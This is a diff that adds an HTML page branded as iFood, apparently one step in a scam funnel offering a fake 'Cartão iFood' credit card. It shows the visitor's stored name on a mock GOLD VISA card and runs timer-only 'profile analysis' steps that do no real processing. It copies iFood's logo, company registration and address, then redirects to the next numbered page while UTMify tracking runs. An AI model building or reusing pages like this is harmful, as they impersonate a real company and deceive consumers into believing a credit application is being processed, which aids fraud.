@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <title>Processando - Cartão iFood</title>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+
+    <script>
+        window.pixelId = "687519d96e183b51aca20836";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Inter', sans-serif;
+            background-color: #ffffff;
+            color: #333;
+            text-align: center;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+            background-color: #EA1D2C;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .header img {
+            width: 125px;
+            padding: 10px;
+            filter: brightness(0) invert(1);
+        }
+
+        .logo {
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .content {
+            padding: 30px 20px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .card {
+            background: linear-gradient(45deg, #EA1D2C, #EA1D2C);
+            border-radius: 15px;
+            padding: 20px;
+            height: 165px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .card-top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 100px;
+        }
+
+        .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .card-name {
+            font-family: 'Inter', sans-serif;
+            font-size: 14px;
+            color: white;
+        }
+
+        .loading-item {
+            color: #666;
+            font-family: 'Inter', sans-serif;
+            margin: 15px 0;
+            opacity: 0;
+
+        }
+
+        .loading-item.visible {
+            opacity: 1;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+            border: 2px solid #EA1D2C;
+            border-top: 4px solid #EA1D2C;
+            border-radius: 50%;
+            margin-bottom: -10px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/IFood_logo.svg/2560px-IFood_logo.svg.png"
+            alt="Logo iFood" class="logo">
+    </div>
+
+    <div class="content">
+        <h2 style="font-family: 'Inter', sans-serif; color: #202020; margin-bottom: 30px;">
+            Aguarde enquanto processamos seu pedido
+        </h2>
+
+        <div class="card"
+            style="background: linear-gradient(135deg, #EA1D2C, #d11625); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border: 1px solid rgba(255,255,255,0.1); overflow: hidden; position: relative; color: #ffffff;">
+            <!-- Efeito de brilho no cartão -->
+            <div
+                style="position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); animation: shine 3s infinite; z-index: 1;">
+            </div>
+            <style>
+                @keyframes shine {
+                    0% {
+                        left: -100%;
+                    }
+
+                    20% {
+                        left: 100%;
+                    }
+
+                    100% {
+                        left: 100%;
+                    }
+                }
+            </style>
+
+            <!-- Topo do cartão -->
+            <div
+                style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px; position: relative; z-index: 2;">
+                <div
+                    style="width: 80px; height: 30px; background: transparent; display: flex; align-items: center; justify-content: center; padding: 5px;">
+                    <img src="https://imagensfree.com.br/wp-content/uploads/2021/11/ifood-logo-bran-gran-9800797.png"
+                        alt="iFood Logo" style="width: 60px; height: auto;">
+                </div>
+                <div
+                    style="font-size: 14px; color: rgba(255,255,255,0.9); font-family: 'Inter', sans-serif; font-weight: 600; letter-spacing: 1px;">
+                    GOLD</div>
+            </div>
+
+            <!-- Meio do cartão -->
+            <div
+                style="display: flex; justify-content: space-between; align-items: center; margin: 25px 0; position: relative; z-index: 2;">
+                <div style="width: 35px; height: 28px;">
+                    <img src="chip.png" alt="Chip do cartão" style="width: 100%; height: 100%; object-fit: contain;">
+                </div>
+                <i class="fas fa-wifi"
+                    style="color: rgba(255,255,255,0.8); font-size: 20px; transform: rotate(90deg);"></i>
+            </div>
+
+            <!-- Base do cartão -->
+            <div
+                style="display: flex; justify-content: space-between; align-items: flex-end; position: relative; z-index: 2;">
+                <div style="display: flex; flex-direction: column; align-items: flex-start;">
+                    <span class="card-name" id="cardName"
+                        style="font-size: 14px; color: white; font-family: 'Inter', sans-serif; font-weight: 600; letter-spacing: 1px; text-shadow: 0 1px 2px rgba(0,0,0,0.3);">
+                        CARREGANDO...
+                    </span>
+                    <script>
+                        document.addEventListener('DOMContentLoaded', function () {
+                            try {
+                                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+                                if (dadosUsuario && dadosUsuario.NOME) {
+                                    document.getElementById('cardName').textContent = dadosUsuario.NOME.toUpperCase();
+                                }
+                            } catch (e) {
+                                console.log('Dados do usuário não encontrados');
+                            }
+                        });
+                    </script>
+                    <span
+                        style="font-size: 8px; color: rgba(255,255,255,0.7); font-family: 'Inter', sans-serif; margin-top: 2px; letter-spacing: 0.5px;">TITULAR
+                        DO CARTÃO</span>
+                </div>
+                <div style="display: flex; flex-direction: column; align-items: flex-end;">
+                    <div
+                        style="width: 40px; height: 25px; background: white; border-radius: 3px; display: flex; align-items: center; justify-content: center; margin-bottom: 2px;">
+                        <span
+                            style="font-size: 10px; color: #1a1a1a; font-weight: bold; font-family: 'Inter', sans-serif;">VISA</span>
+                    </div>
+                    <span
+                        style="font-size: 8px; color: rgba(255,255,255,0.7); font-family: 'Inter', sans-serif; letter-spacing: 0.5px;">CRÉDITO</span>
+                </div>
+            </div>
+
+            <!-- Padrão de segurança no fundo do cartão -->
+            <div
+                style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-image: repeating-linear-gradient(45deg, rgba(255,255,255,0.02) 0px, rgba(255,255,255,0.02) 2px, transparent 2px, transparent 4px); pointer-events: none; z-index: 0;">
+            </div>
+        </div>
+
+        <div id="loadingItems" style="margin: 0px 20px;">
+            <div class="loading-item" style="text-align: left;">
+                <div class="loading-spinner"></div>
+                Aguardando resposta
+            </div>
+            <div class="loading-item" style="text-align: left;">
+                <div class="loading-spinner"></div>
+                Analisando seu perfil
+            </div>
+            <div class="loading-item" style="text-align: left;">
+                <div class="loading-spinner"></div>
+                Preparando seu cartão
+            </div>
+            <div class="loading-item" style="text-align: left;">
+                <div class="loading-spinner"></div>
+                Finalizando solicitação
+            </div>
+        </div>
+    </div>
+
+    <footer
+        style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Inter', sans-serif;">
+        <div style="max-width: 600px; margin: 0 auto;">
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                iFood.com Agência de Restaurantes Online S.A. | CNPJ: 14.380.200/0001-21
+            </p>
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                Rua Jasmin, 660 - Vila Madalena, São Paulo - SP, 05042-001
+            </p>
+            <p style="color: #999; font-size: 9px; margin-top: 5px;">
+                © 2025 - Todos os direitos reservados
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        function showLoadingItems() {
+            const items = document.querySelectorAll('.loading-item');
+            items.forEach((item, index) => {
+                setTimeout(() => {
+                    item.classList.add('visible');
+
+                    // Adiciona o check com círculo após o item ficar visível
+                    setTimeout(() => {
+                        const spinner = item.querySelector('.loading-spinner');
+                        spinner.style.display = 'none'; // Esconde o spinner
+                        spinner.insertAdjacentHTML('afterend', `
+                            <div style="
+                                width: 20px;
+                                height: 20px;
+                                background-color: #4CAF50;
+                                border-radius: 50%;
+                                display: inline-flex;
+                                align-items: center;
+                                justify-content: center;
+                                position: relative;
+                                margin-right: 10px;
+                                vertical-align: middle;
+                            ">
+                                <i class="fas fa-check" style="color: white; font-size: 14px;"></i>
+                            </div>
+                        `);
+                    }, 1750);
+                }, index * 2250);
+            });
+
+            setTimeout(() => {
+                window.location.href = buildUrlWithParams('/7/');
+            }, 9000);
+        }
+
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+
+            return url.toString();
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            showLoadingItems();
+        });
+    </script>
+</body>
+
+</html>
